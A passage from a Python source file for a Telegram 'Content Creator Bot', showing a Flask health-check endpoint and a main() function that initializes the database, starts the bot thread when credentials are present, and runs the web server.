        with app.app_context():
            user_count = User.query.count()
        
        return {
            'status': 'healthy',
            'database': 'connected',
            'user_count': user_count,
            'bot_mode': 'active' if os.getenv('BOT_TOKEN') and int(os.getenv('OWNER_ID', '0')) != 0 else 'web-only'
        }
    except Exception as e:
        return {'status': 'error', 'message': str(e)}, 500

def main():
    """Main function to initialize and start the bot"""
    logger.info("Initializing Content Creator Bot...")
    
    # Initialize database
    init_database()
    
    # Only start bot if we have valid credentials
    original_bot_token = os.getenv('BOT_TOKEN')
    original_owner_id = int(os.getenv('OWNER_ID', '0'))
    
    if original_bot_token and original_owner_id != 0:
        logger.info("Valid credentials found - starting bot polling...")
        # Start bot in a separate thread
        bot_thread = threading.Thread(target=run_bot)
        bot_thread.daemon = True
        bot_thread.start()
    else:
        logger.info("Missing bot credentials - running in web-only mode")
        logger.info("Add BOT_TOKEN and OWNER_ID to Replit Secrets to enable Telegram bot functionality")
    
    # Start Flask server
    port = int(os.environ.get('PORT', 5000))
    logger.info(f"Starting Flask server on 0.0.0.0:{port}...")
    app.run(host='0.0.0.0', port=port, debug=False)

if __name__ == '__main__':
    main()
